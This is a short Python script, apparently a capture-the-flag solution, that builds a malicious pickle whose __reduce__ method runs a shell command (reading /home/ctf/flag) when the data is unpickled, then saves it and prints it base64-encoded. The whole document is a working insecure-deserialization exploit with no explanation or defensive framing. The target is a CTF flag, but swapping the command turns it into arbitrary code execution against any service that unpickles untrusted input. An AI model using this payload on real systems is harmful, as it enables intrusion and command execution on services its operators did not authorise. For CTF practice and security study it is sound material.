import pickle
import subprocess
import base64

class Pickle:
    def __reduce__(self):
        return subprocess.check_output,(['cat','/home/ctf/flag'],)
    
malicious_pickle=pickle.dumps(Pickle())

with open('malicious_pickle','wb') as f:
    f.write(malicious_pickle)

encoded=base64.b64encode(malicious_pickle).decode()
print(encoded)
